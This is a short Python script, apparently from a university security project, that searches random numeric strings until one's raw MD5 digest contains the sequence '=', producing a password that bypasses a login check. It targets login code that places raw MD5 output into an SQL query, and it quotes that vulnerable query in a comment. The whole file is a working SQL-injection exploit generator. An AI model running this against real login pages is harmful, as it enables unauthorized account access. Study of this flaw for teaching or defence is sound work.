from pymd5 import md5
import os, random, re, time
# Injectable line: $sql_s = "SELECT * FROM users WHERE username='$username' and pw='$password'";
# Md5 hashes can contain '=' in its raw state which can be used in sql injection
'''
The program randomly generates 3 string integer value and combines them, hashes the value
and looks for a '=', '=' is a part of a tradition injectable sql statement for the password field
then prints the value out if the search does not return None.  That value can then be 
inputed into the website.

Reused the pymd5.py file from project 1.
'''
i = 0
while (True):
    print(i)
    rand = (str(random.randint(0, 2147483647)) + str(
        random.randint(0, 2147483647)) + str(random.randint(0, 2147483647)))
    find = re.search(r"'='", md5(rand).digest())
    if find != None:
        print "Out: " + rand
        break
    i = i + 1